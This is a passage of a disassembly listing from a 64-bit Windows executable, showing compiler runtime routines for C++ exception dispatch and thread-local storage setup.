   140004938:	4c 8b ea             	mov    %rdx,%r13
   14000493b:	e8 14 04 00 00       	call   0x140004d54
   140004940:	4d 8b 67 08          	mov    0x8(%r15),%r12
   140004944:	4d 8b 37             	mov    (%r15),%r14
   140004947:	49 8b 5f 38          	mov    0x38(%r15),%rbx
   14000494b:	4d 2b f4             	sub    %r12,%r14
   14000494e:	f6 46 04 66          	testb  $0x66,0x4(%rsi)
   140004952:	41 8b 7f 48          	mov    0x48(%r15),%edi
   140004956:	0f 85 f1 00 00 00    	jne    0x140004a4d
   14000495c:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140004961:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   140004966:	e9 ce 00 00 00       	jmp    0x140004a39
   14000496b:	8b cf                	mov    %edi,%ecx
   14000496d:	48 03 c9             	add    %rcx,%rcx
   140004970:	8b ef                	mov    %edi,%ebp
   140004972:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   140004976:	4c 3b f0             	cmp    %rax,%r14
   140004979:	0f 82 b8 00 00 00    	jb     0x140004a37
   14000497f:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   140004983:	4c 3b f0             	cmp    %rax,%r14
   140004986:	0f 83 ab 00 00 00    	jae    0x140004a37
   14000498c:	83 7c cb 10 00       	cmpl   $0x0,0x10(%rbx,%rcx,8)
   140004991:	0f 84 a0 00 00 00    	je     0x140004a37
   140004997:	83 7c cb 0c 01       	cmpl   $0x1,0xc(%rbx,%rcx,8)
   14000499c:	74 1b                	je     0x1400049b9
   14000499e:	8b 44 cb 0c          	mov    0xc(%rbx,%rcx,8),%eax
   1400049a2:	49 8b d5             	mov    %r13,%rdx
   1400049a5:	49 03 c4             	add    %r12,%rax
   1400049a8:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400049ad:	ff d0                	call   *%rax
   1400049af:	85 c0                	test   %eax,%eax
   1400049b1:	0f 88 8f 00 00 00    	js     0x140004a46
   1400049b7:	7e 7e                	jle    0x140004a37
   1400049b9:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%rsi)
   1400049bf:	75 28                	jne    0x1400049e9
   1400049c1:	48 83 3d 57 f0 00 00 	cmpq   $0x0,0xf057(%rip)        # 0x140013a20
   1400049c8:	00 
   1400049c9:	74 1e                	je     0x1400049e9
   1400049cb:	48 8d 0d 4e f0 00 00 	lea    0xf04e(%rip),%rcx        # 0x140013a20
   1400049d2:	e8 69 ae 00 00       	call   0x14000f840
   1400049d7:	85 c0                	test   %eax,%eax
   1400049d9:	74 0e                	je     0x1400049e9
   1400049db:	ba 01 00 00 00       	mov    $0x1,%edx
   1400049e0:	48 8b ce             	mov    %rsi,%rcx
   1400049e3:	ff 15 37 f0 00 00    	call   *0xf037(%rip)        # 0x140013a20
   1400049e9:	48 8d 45 01          	lea    0x1(%rbp),%rax
   1400049ed:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400049f3:	48 03 c0             	add    %rax,%rax
   1400049f6:	49 8b d5             	mov    %r13,%rdx
   1400049f9:	8b 0c c3             	mov    (%rbx,%rax,8),%ecx
   1400049fc:	49 03 cc             	add    %r12,%rcx
   1400049ff:	e8 1c 03 00 00       	call   0x140004d20
   140004a04:	44 8b 0e             	mov    (%rsi),%r9d
   140004a07:	48 8d 45 01          	lea    0x1(%rbp),%rax
   140004a0b:	48 03 c0             	add    %rax,%rax
   140004a0e:	4c 8b c6             	mov    %rsi,%r8
   140004a11:	49 8b cd             	mov    %r13,%rcx
   140004a14:	8b 14 c3             	mov    (%rbx,%rax,8),%edx
   140004a17:	49 8b 47 40          	mov    0x40(%r15),%rax
   140004a1b:	49 03 d4             	add    %r12,%rdx
   140004a1e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004a23:	49 8b 47 28          	mov    0x28(%r15),%rax
   140004a27:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004a2c:	ff 15 06 c7 00 00    	call   *0xc706(%rip)        # 0x140011138
   140004a32:	e8 19 03 00 00       	call   0x140004d50
   140004a37:	ff c7                	inc    %edi
   140004a39:	3b 3b                	cmp    (%rbx),%edi
   140004a3b:	0f 82 2a ff ff ff    	jb     0x14000496b
   140004a41:	e9 be 00 00 00       	jmp    0x140004b04
   140004a46:	33 c0                	xor    %eax,%eax
   140004a48:	e9 bc 00 00 00       	jmp    0x140004b09
   140004a4d:	49 8b 6f 20          	mov    0x20(%r15),%rbp
   140004a51:	49 2b ec             	sub    %r12,%rbp
   140004a54:	e9 9f 00 00 00       	jmp    0x140004af8
   140004a59:	44 8b cf             	mov    %edi,%r9d
   140004a5c:	4d 03 c9             	add    %r9,%r9
   140004a5f:	42 8b 44 cb 04       	mov    0x4(%rbx,%r9,8),%eax
   140004a64:	4c 3b f0             	cmp    %rax,%r14
   140004a67:	0f 82 89 00 00 00    	jb     0x140004af6
   140004a6d:	42 8b 44 cb 08       	mov    0x8(%rbx,%r9,8),%eax
   140004a72:	4c 3b f0             	cmp    %rax,%r14
   140004a75:	73 7f                	jae    0x140004af6
   140004a77:	f6 46 04 20          	testb  $0x20,0x4(%rsi)
   140004a7b:	74 3f                	je     0x140004abc
   140004a7d:	33 d2                	xor    %edx,%edx
   140004a7f:	45 85 c0             	test   %r8d,%r8d
   140004a82:	74 34                	je     0x140004ab8
   140004a84:	8b ca                	mov    %edx,%ecx
   140004a86:	48 03 c9             	add    %rcx,%rcx
   140004a89:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   140004a8d:	48 3b e8             	cmp    %rax,%rbp
   140004a90:	72 1f                	jb     0x140004ab1
   140004a92:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   140004a96:	48 3b e8             	cmp    %rax,%rbp
   140004a99:	73 16                	jae    0x140004ab1
   140004a9b:	42 8b 44 cb 10       	mov    0x10(%rbx,%r9,8),%eax
   140004aa0:	39 44 cb 10          	cmp    %eax,0x10(%rbx,%rcx,8)
   140004aa4:	75 0b                	jne    0x140004ab1
   140004aa6:	42 8b 44 cb 0c       	mov    0xc(%rbx,%r9,8),%eax
   140004aab:	39 44 cb 0c          	cmp    %eax,0xc(%rbx,%rcx,8)
   140004aaf:	74 07                	je     0x140004ab8
   140004ab1:	ff c2                	inc    %edx
   140004ab3:	41 3b d0             	cmp    %r8d,%edx
   140004ab6:	72 cc                	jb     0x140004a84
   140004ab8:	3b 13                	cmp    (%rbx),%edx
   140004aba:	75 48                	jne    0x140004b04
   140004abc:	8b c7                	mov    %edi,%eax
   140004abe:	48 ff c0             	inc    %rax
   140004ac1:	8b cf                	mov    %edi,%ecx
   140004ac3:	48 03 c0             	add    %rax,%rax
   140004ac6:	48 03 c9             	add    %rcx,%rcx
   140004ac9:	83 3c c3 00          	cmpl   $0x0,(%rbx,%rax,8)
   140004acd:	74 10                	je     0x140004adf
   140004acf:	8b 04 c3             	mov    (%rbx,%rax,8),%eax
   140004ad2:	48 3b e8             	cmp    %rax,%rbp
   140004ad5:	75 1f                	jne    0x140004af6
   140004ad7:	f6 46 04 20          	testb  $0x20,0x4(%rsi)
   140004adb:	75 27                	jne    0x140004b04
   140004add:	eb 17                	jmp    0x140004af6
   140004adf:	8d 47 01             	lea    0x1(%rdi),%eax
   140004ae2:	49 8b d5             	mov    %r13,%rdx
   140004ae5:	41 89 47 48          	mov    %eax,0x48(%r15)
   140004ae9:	44 8b 44 cb 0c       	mov    0xc(%rbx,%rcx,8),%r8d
   140004aee:	b1 01                	mov    $0x1,%cl
   140004af0:	4d 03 c4             	add    %r12,%r8
   140004af3:	41 ff d0             	call   *%r8
   140004af6:	ff c7                	inc    %edi
   140004af8:	44 8b 03             	mov    (%rbx),%r8d
   140004afb:	41 3b f8             	cmp    %r8d,%edi
   140004afe:	0f 82 55 ff ff ff    	jb     0x140004a59
   140004b04:	b8 01 00 00 00       	mov    $0x1,%eax
   140004b09:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   140004b0e:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140004b12:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   140004b16:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140004b1a:	49 8b e3             	mov    %r11,%rsp
   140004b1d:	41 5f                	pop    %r15
   140004b1f:	41 5e                	pop    %r14
   140004b21:	41 5d                	pop    %r13
   140004b23:	41 5c                	pop    %r12
   140004b25:	5f                   	pop    %rdi
   140004b26:	c3                   	ret
   140004b27:	cc                   	int3
   140004b28:	48 83 ec 28          	sub    $0x28,%rsp
   140004b2c:	e8 d3 03 00 00       	call   0x140004f04
   140004b31:	84 c0                	test   %al,%al
   140004b33:	75 04                	jne    0x140004b39
   140004b35:	32 c0                	xor    %al,%al
   140004b37:	eb 12                	jmp    0x140004b4b
   140004b39:	e8 56 03 00 00       	call   0x140004e94
   140004b3e:	84 c0                	test   %al,%al
   140004b40:	75 07                	jne    0x140004b49
   140004b42:	e8 05 04 00 00       	call   0x140004f4c
   140004b47:	eb ec                	jmp    0x140004b35
   140004b49:	b0 01                	mov    $0x1,%al
   140004b4b:	48 83 c4 28          	add    $0x28,%rsp
   140004b4f:	c3                   	ret
   140004b50:	48 83 ec 28          	sub    $0x28,%rsp
   140004b54:	84 c9                	test   %cl,%cl
   140004b56:	75 0a                	jne    0x140004b62
   140004b58:	e8 7f 03 00 00       	call   0x140004edc
   140004b5d:	e8 ea 03 00 00       	call   0x140004f4c
   140004b62:	b0 01                	mov    $0x1,%al
   140004b64:	48 83 c4 28          	add    $0x28,%rsp
   140004b68:	c3                   	ret
   140004b69:	cc                   	int3
   140004b6a:	cc                   	int3
   140004b6b:	cc                   	int3
   140004b6c:	48 3b ca             	cmp    %rdx,%rcx
   140004b6f:	75 03                	jne    0x140004b74
   140004b71:	33 c0                	xor    %eax,%eax
   140004b73:	c3                   	ret
   140004b74:	48 83 c2 09          	add    $0x9,%rdx
   140004b78:	48 83 c1 09          	add    $0x9,%rcx
   140004b7c:	e9 ef ba 00 00       	jmp    0x140010670
   140004b81:	cc                   	int3
   140004b82:	cc                   	int3
   140004b83:	cc                   	int3
   140004b84:	48 85 c9             	test   %rcx,%rcx
   140004b87:	74 6e                	je     0x140004bf7
   140004b89:	88 54 24 10          	mov    %dl,0x10(%rsp)
   140004b8d:	48 83 ec 48          	sub    $0x48,%rsp
   140004b91:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%rcx)
   140004b97:	75 5a                	jne    0x140004bf3
   140004b99:	83 79 18 04          	cmpl   $0x4,0x18(%rcx)
   140004b9d:	75 54                	jne    0x140004bf3
   140004b9f:	8b 41 20             	mov    0x20(%rcx),%eax
   140004ba2:	3d 20 05 93 19       	cmp    $0x19930520,%eax
   140004ba7:	74 0a                	je     0x140004bb3
   140004ba9:	05 df fa 6c e6       	add    $0xe66cfadf,%eax
   140004bae:	83 f8 01             	cmp    $0x1,%eax
   140004bb1:	77 40                	ja     0x140004bf3
   140004bb3:	48 8b 41 30          	mov    0x30(%rcx),%rax
   140004bb7:	48 85 c0             	test   %rax,%rax
   140004bba:	74 37                	je     0x140004bf3
   140004bbc:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140004bc0:	85 d2                	test   %edx,%edx
   140004bc2:	74 11                	je     0x140004bd5
   140004bc4:	48 03 51 38          	add    0x38(%rcx),%rdx
   140004bc8:	48 8b 49 28          	mov    0x28(%rcx),%rcx
   140004bcc:	e8 27 00 00 00       	call   0x140004bf8
   140004bd1:	eb 20                	jmp    0x140004bf3
   140004bd3:	eb 1e                	jmp    0x140004bf3
   140004bd5:	f6 00 10             	testb  $0x10,(%rax)
   140004bd8:	74 19                	je     0x140004bf3
   140004bda:	48 8b 41 28          	mov    0x28(%rcx),%rax
   140004bde:	48 8b 08             	mov    (%rax),%rcx
   140004be1:	48 85 c9             	test   %rcx,%rcx
   140004be4:	74 0d                	je     0x140004bf3
   140004be6:	48 8b 01             	mov    (%rcx),%rax
   140004be9:	48 8b 40 10          	mov    0x10(%rax),%rax
   140004bed:	ff 15 e5 c6 00 00    	call   *0xc6e5(%rip)        # 0x1400112d8
   140004bf3:	48 83 c4 48          	add    $0x48,%rsp
   140004bf7:	c3                   	ret
   140004bf8:	48 ff e2             	rex.W jmp *%rdx
   140004bfb:	cc                   	int3
   140004bfc:	40 53                	rex push %rbx
   140004bfe:	48 83 ec 20          	sub    $0x20,%rsp
   140004c02:	48 8b d9             	mov    %rcx,%rbx
   140004c05:	e8 a2 01 00 00       	call   0x140004dac
   140004c0a:	48 8b 50 58          	mov    0x58(%rax),%rdx
   140004c0e:	eb 09                	jmp    0x140004c19
   140004c10:	48 39 1a             	cmp    %rbx,(%rdx)
   140004c13:	74 12                	je     0x140004c27
   140004c15:	48 8b 52 08          	mov    0x8(%rdx),%rdx
   140004c19:	48 85 d2             	test   %rdx,%rdx
   140004c1c:	75 f2                	jne    0x140004c10
   140004c1e:	8d 42 01             	lea    0x1(%rdx),%eax
   140004c21:	48 83 c4 20          	add    $0x20,%rsp
   140004c25:	5b                   	pop    %rbx
   140004c26:	c3                   	ret
   140004c27:	33 c0                	xor    %eax,%eax
   140004c29:	eb f6                	jmp    0x140004c21
   140004c2b:	cc                   	int3
   140004c2c:	48 63 02             	movslq (%rdx),%rax
   140004c2f:	48 03 c1             	add    %rcx,%rax
   140004c32:	83 7a 04 00          	cmpl   $0x0,0x4(%rdx)
   140004c36:	7c 16                	jl     0x140004c4e
   140004c38:	4c 63 4a 04          	movslq 0x4(%rdx),%r9
   140004c3c:	48 63 52 08          	movslq 0x8(%rdx),%rdx
   140004c40:	49 8b 0c 09          	mov    (%r9,%rcx,1),%rcx
   140004c44:	4c 63 04 0a          	movslq (%rdx,%rcx,1),%r8
   140004c48:	4d 03 c1             	add    %r9,%r8
   140004c4b:	49 03 c0             	add    %r8,%rax
   140004c4e:	c3                   	ret
   140004c4f:	cc                   	int3
   140004c50:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004c55:	57                   	push   %rdi
   140004c56:	48 83 ec 20          	sub    $0x20,%rsp
   140004c5a:	48 8b 39             	mov    (%rcx),%rdi
   140004c5d:	48 8b d9             	mov    %rcx,%rbx
   140004c60:	81 3f 52 43 43 e0    	cmpl   $0xe0434352,(%rdi)
   140004c66:	74 12                	je     0x140004c7a
   140004c68:	81 3f 4d 4f 43 e0    	cmpl   $0xe0434f4d,(%rdi)
   140004c6e:	74 0a                	je     0x140004c7a
   140004c70:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   140004c76:	74 22                	je     0x140004c9a
   140004c78:	eb 13                	jmp    0x140004c8d
   140004c7a:	e8 2d 01 00 00       	call   0x140004dac
   140004c7f:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   140004c83:	7e 08                	jle    0x140004c8d
   140004c85:	e8 22 01 00 00       	call   0x140004dac
   140004c8a:	ff 48 30             	decl   0x30(%rax)
   140004c8d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004c92:	33 c0                	xor    %eax,%eax
   140004c94:	48 83 c4 20          	add    $0x20,%rsp
   140004c98:	5f                   	pop    %rdi
   140004c99:	c3                   	ret
   140004c9a:	e8 0d 01 00 00       	call   0x140004dac
   140004c9f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140004ca3:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   140004ca7:	e8 00 01 00 00       	call   0x140004dac
   140004cac:	48 89 58 28          	mov    %rbx,0x28(%rax)
   140004cb0:	e8 4f 3b 00 00       	call   0x140008804
   140004cb5:	cc                   	int3
   140004cb6:	cc                   	int3
   140004cb7:	cc                   	int3
   140004cb8:	48 83 ec 28          	sub    $0x28,%rsp
   140004cbc:	e8 eb 00 00 00       	call   0x140004dac
   140004cc1:	48 83 c0 20          	add    $0x20,%rax
   140004cc5:	48 83 c4 28          	add    $0x28,%rsp
   140004cc9:	c3                   	ret
   140004cca:	cc                   	int3
   140004ccb:	cc                   	int3
   140004ccc:	48 83 ec 28          	sub    $0x28,%rsp
   140004cd0:	e8 d7 00 00 00       	call   0x140004dac
   140004cd5:	48 83 c0 28          	add    $0x28,%rax
   140004cd9:	48 83 c4 28          	add    $0x28,%rsp
   140004cdd:	c3                   	ret
   140004cde:	cc                   	int3
   140004cdf:	cc                   	int3
   140004ce0:	48 83 ec 28          	sub    $0x28,%rsp
   140004ce4:	e8 1b 3b 00 00       	call   0x140008804
   140004ce9:	cc                   	int3
   140004cea:	cc                   	int3
   140004ceb:	cc                   	int3
   140004cec:	cc                   	int3
   140004ced:	cc                   	int3
   140004cee:	cc                   	int3
   140004cef:	cc                   	int3
   140004cf0:	cc                   	int3
   140004cf1:	cc                   	int3
   140004cf2:	cc                   	int3
   140004cf3:	cc                   	int3
   140004cf4:	cc                   	int3
   140004cf5:	cc                   	int3
   140004cf6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140004cfd:	00 00 00 
   140004d00:	cc                   	int3
   140004d01:	cc                   	int3
   140004d02:	cc                   	int3
   140004d03:	cc                   	int3
   140004d04:	cc                   	int3
   140004d05:	cc                   	int3
   140004d06:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140004d0d:	00 00 00 
   140004d10:	cc                   	int3
   140004d11:	cc                   	int3
   140004d12:	cc                   	int3
   140004d13:	cc                   	int3
   140004d14:	cc                   	int3
   140004d15:	cc                   	int3
   140004d16:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140004d1d:	00 00 00 
   140004d20:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140004d25:	48 89 54 24 18       	mov    %rdx,0x18(%rsp)
   140004d2a:	44 89 44 24 10       	mov    %r8d,0x10(%rsp)
   140004d2f:	49 c7 c1 20 05 93 19 	mov    $0x19930520,%r9
   140004d36:	e9 05 00 00 00       	jmp    0x140004d40
   140004d3b:	cc                   	int3
   140004d3c:	cc                   	int3
   140004d3d:	cc                   	int3
   140004d3e:	cc                   	int3
   140004d3f:	cc                   	int3
   140004d40:	c3                   	ret
   140004d41:	cc                   	int3
   140004d42:	cc                   	int3
   140004d43:	cc                   	int3
   140004d44:	cc                   	int3
   140004d45:	cc                   	int3
   140004d46:	cc                   	int3
   140004d47:	cc                   	int3
   140004d48:	cc                   	int3
   140004d49:	cc                   	int3
   140004d4a:	cc                   	int3
   140004d4b:	cc                   	int3
   140004d4c:	cc                   	int3
   140004d4d:	cc                   	int3
   140004d4e:	cc                   	int3
   140004d4f:	cc                   	int3
   140004d50:	c3                   	ret
   140004d51:	cc                   	int3
   140004d52:	cc                   	int3
   140004d53:	cc                   	int3
   140004d54:	48 8b 05 6d c5 00 00 	mov    0xc56d(%rip),%rax        # 0x1400112c8
   140004d5b:	48 8d 15 2a f7 ff ff 	lea    -0x8d6(%rip),%rdx        # 0x14000448c
   140004d62:	48 3b c2             	cmp    %rdx,%rax
   140004d65:	74 23                	je     0x140004d8a
   140004d67:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140004d6e:	00 00 
   140004d70:	48 8b 89 98 00 00 00 	mov    0x98(%rcx),%rcx
   140004d77:	48 3b 48 10          	cmp    0x10(%rax),%rcx
   140004d7b:	72 06                	jb     0x140004d83
   140004d7d:	48 3b 48 08          	cmp    0x8(%rax),%rcx
   140004d81:	76 07                	jbe    0x140004d8a
   140004d83:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140004d88:	cd 29                	int    $0x29
   140004d8a:	c3                   	ret
   140004d8b:	cc                   	int3
   140004d8c:	48 83 ec 28          	sub    $0x28,%rsp
   140004d90:	48 85 c9             	test   %rcx,%rcx
   140004d93:	74 11                	je     0x140004da6
   140004d95:	48 8d 05 c4 a3 01 00 	lea    0x1a3c4(%rip),%rax        # 0x14001f160
   140004d9c:	48 3b c8             	cmp    %rax,%rcx
   140004d9f:	74 05                	je     0x140004da6
   140004da1:	e8 da 34 00 00       	call   0x140008280
   140004da6:	48 83 c4 28          	add    $0x28,%rsp
   140004daa:	c3                   	ret
   140004dab:	cc                   	int3
   140004dac:	48 83 ec 28          	sub    $0x28,%rsp
   140004db0:	e8 13 00 00 00       	call   0x140004dc8
   140004db5:	48 85 c0             	test   %rax,%rax
   140004db8:	74 05                	je     0x140004dbf
   140004dba:	48 83 c4 28          	add    $0x28,%rsp
   140004dbe:	c3                   	ret
   140004dbf:	e8 ec 3a 00 00       	call   0x1400088b0
   140004dc4:	cc                   	int3
   140004dc5:	cc                   	int3
   140004dc6:	cc                   	int3
   140004dc7:	cc                   	int3
   140004dc8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004dcd:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004dd2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004dd7:	57                   	push   %rdi
   140004dd8:	48 83 ec 20          	sub    $0x20,%rsp
   140004ddc:	83 3d 9d 92 01 00 ff 	cmpl   $0xffffffff,0x1929d(%rip)        # 0x14001e080
   140004de3:	75 07                	jne    0x140004dec
   140004de5:	33 c0                	xor    %eax,%eax
   140004de7:	e9 90 00 00 00       	jmp    0x140004e7c
   140004dec:	ff 15 4e c3 00 00    	call   *0xc34e(%rip)        # 0x140011140
   140004df2:	8b 0d 88 92 01 00    	mov    0x19288(%rip),%ecx        # 0x14001e080
   140004df8:	8b f8                	mov    %eax,%edi
   140004dfa:	e8 65 03 00 00       	call   0x140005164
   140004dff:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140004e03:	33 f6                	xor    %esi,%esi
   140004e05:	48 3b c2             	cmp    %rdx,%rax
   140004e08:	74 67                	je     0x140004e71
   140004e0a:	48 85 c0             	test   %rax,%rax
   140004e0d:	74 05                	je     0x140004e14
   140004e0f:	48 8b f0             	mov    %rax,%rsi
   140004e12:	eb 5d                	jmp    0x140004e71
   140004e14:	8b 0d 66 92 01 00    	mov    0x19266(%rip),%ecx        # 0x14001e080
   140004e1a:	e8 8d 03 00 00       	call   0x1400051ac
   140004e1f:	85 c0                	test   %eax,%eax
   140004e21:	74 4e                	je     0x140004e71
   140004e23:	ba 80 00 00 00       	mov    $0x80,%edx
   140004e28:	8d 4a 81             	lea    -0x7f(%rdx),%ecx
   140004e2b:	e8 e0 3a 00 00       	call   0x140008910
   140004e30:	8b 0d 4a 92 01 00    	mov    0x1924a(%rip),%ecx        # 0x14001e080
   140004e36:	48 8b e8             	mov    %rax,%rbp
   140004e39:	48 8b d8             	mov    %rax,%rbx
   140004e3c:	48 85 c0             	test   %rax,%rax
   140004e3f:	74 21                	je     0x140004e62
   140004e41:	48 8b d0             	mov    %rax,%rdx
   140004e44:	e8 63 03 00 00       	call   0x1400051ac
   140004e49:	85 c0                	test   %eax,%eax
   140004e4b:	74 0f                	je     0x140004e5c
   140004e4d:	c7 43 78 fe ff ff ff 	movl   $0xfffffffe,0x78(%rbx)
   140004e54:	48 8b de             	mov    %rsi,%rbx
   140004e57:	48 8b f5             	mov    %rbp,%rsi
   140004e5a:	eb 0d                	jmp    0x140004e69
   140004e5c:	8b 0d 1e 92 01 00    	mov    0x1921e(%rip),%ecx        # 0x14001e080
   140004e62:	33 d2                	xor    %edx,%edx
   140004e64:	e8 43 03 00 00       	call   0x1400051ac
   140004e69:	48 8b cb             	mov    %rbx,%rcx
   140004e6c:	e8 0f 34 00 00       	call   0x140008280
   140004e71:	8b cf                	mov    %edi,%ecx
   140004e73:	ff 15 cf c2 00 00    	call   *0xc2cf(%rip)        # 0x140011148
   140004e79:	48 8b c6             	mov    %rsi,%rax
   140004e7c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004e81:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140004e86:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140004e8b:	48 83 c4 20          	add    $0x20,%rsp
   140004e8f:	5f                   	pop    %rdi
   140004e90:	c3                   	ret
   140004e91:	cc                   	int3
   140004e92:	cc                   	int3
   140004e93:	cc                   	int3
   140004e94:	48 83 ec 28          	sub    $0x28,%rsp
   140004e98:	48 8d 0d ed fe ff ff 	lea    -0x113(%rip),%rcx        # 0x140004d8c
   140004e9f:	e8 30 02 00 00       	call   0x1400050d4
   140004ea4:	89 05 d6 91 01 00    	mov    %eax,0x191d6(%rip)        # 0x14001e080
   140004eaa:	83 f8 ff             	cmp    $0xffffffff,%eax
   140004ead:	74 25                	je     0x140004ed4
   140004eaf:	48 8d 15 aa a2 01 00 	lea    0x1a2aa(%rip),%rdx        # 0x14001f160
   140004eb6:	8b c8                	mov    %eax,%ecx
   140004eb8:	e8 ef 02 00 00       	call   0x1400051ac
   140004ebd:	85 c0                	test   %eax,%eax
   140004ebf:	74 0e                	je     0x140004ecf
   140004ec1:	c7 05 0d a3 01 00 fe 	movl   $0xfffffffe,0x1a30d(%rip)        # 0x14001f1d8
   140004ec8:	ff ff ff 
   140004ecb:	b0 01                	mov    $0x1,%al
   140004ecd:	eb 07                	jmp    0x140004ed6
   140004ecf:	e8 08 00 00 00       	call   0x140004edc
   140004ed4:	32 c0                	xor    %al,%al
   140004ed6:	48 83 c4 28          	add    $0x28,%rsp
   140004eda:	c3                   	ret
   140004edb:	cc                   	int3
   140004edc:	48 83 ec 28          	sub    $0x28,%rsp
   140004ee0:	8b 0d 9a 91 01 00    	mov    0x1919a(%rip),%ecx        # 0x14001e080
   140004ee6:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140004ee9:	74 0f                	je     0x140004efa
   140004eeb:	e8 2c 02 00 00       	call   0x14000511c
   140004ef0:	c7 05 86 91 01 00 ff 	movl   $0xffffffff,0x19186(%rip)        # 0x14001e080
   140004ef7:	ff ff ff 
   140004efa:	b0 01                	mov    $0x1,%al
   140004efc:	48 83 c4 28          	add    $0x28,%rsp
   140004f00:	c3                   	ret
   140004f01:	cc                   	int3
   140004f02:	cc                   	int3
   140004f03:	cc                   	int3
   140004f04:	40 53                	rex push %rbx
   140004f06:	48 83 ec 20          	sub    $0x20,%rsp
   140004f0a:	33 db                	xor    %ebx,%ebx
   140004f0c:	48 8d 15 cd a2 01 00 	lea    0x1a2cd(%rip),%rdx        # 0x14001f1e0
   140004f13:	45 33 c0             	xor    %r8d,%r8d
   140004f16:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140004f1a:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   140004f1e:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140004f23:	e8 d8 02 00 00       	call   0x140005200
   140004f28:	85 c0                	test   %eax,%eax
   140004f2a:	74 11                	je     0x140004f3d
   140004f2c:	ff 05 d6 a2 01 00    	incl   0x1a2d6(%rip)        # 0x14001f208
   140004f32:	ff c3                	inc    %ebx
   140004f34:	83 fb 01             	cmp    $0x1,%ebx
   140004f37:	72 d3                	jb     0x140004f0c
   140004f39:	b0 01                	mov    $0x1,%al
   140004f3b:	eb 07                	jmp    0x140004f44
   140004f3d:	e8 0a 00 00 00       	call   0x140004f4c
   140004f42:	32 c0                	xor    %al,%al
   140004f44:	48 83 c4 20          	add    $0x20,%rsp
   140004f48:	5b                   	pop    %rbx
   140004f49:	c3                   	ret
   140004f4a:	cc                   	int3
   140004f4b:	cc                   	int3
   140004f4c:	40 53                	rex push %rbx
